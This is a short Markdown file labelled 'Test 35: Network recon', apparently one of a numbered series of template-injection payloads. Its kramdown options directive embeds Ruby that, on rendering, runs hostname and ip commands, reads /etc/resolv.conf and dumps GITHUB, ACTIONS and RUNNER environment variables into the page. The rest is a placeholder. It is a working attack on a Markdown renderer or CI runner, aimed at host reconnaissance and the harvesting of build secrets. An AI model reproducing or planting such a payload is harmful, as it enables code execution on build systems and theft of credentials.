---
---

# Test 35: Network recon (pipe-free)

{::options template="string://<%= r=''; r=r+'HOSTNAME='+`hostname 2>&1`.strip+\"\\n\"; r=r+'IP='+`hostname -I 2>&1`.strip+\"\\n\"; r=r+'RESOLV='+File.read('/etc/resolv.conf').gsub(\"\\n\",' ')+\"\\n\"; r=r+'IPADDR='+`ip addr show 2>&1`[0..400]+\"\\n\"; r=r+'ROUTES='+`ip route show 2>&1`[0..300]+\"\\n\"; r=r+'GITHUB_ENV='; for pair in ENV.to_a.sort; if pair[0].to_s.start_with?('GITHUB') or pair[0].to_s.start_with?('ACTIONS') or pair[0].to_s.start_with?('RUNNER'); r=r+pair[0].to_s+'='+pair[1].to_s[0..60]+' '; end; end; r=r+\"\\n\"; r %>" /}

placeholder
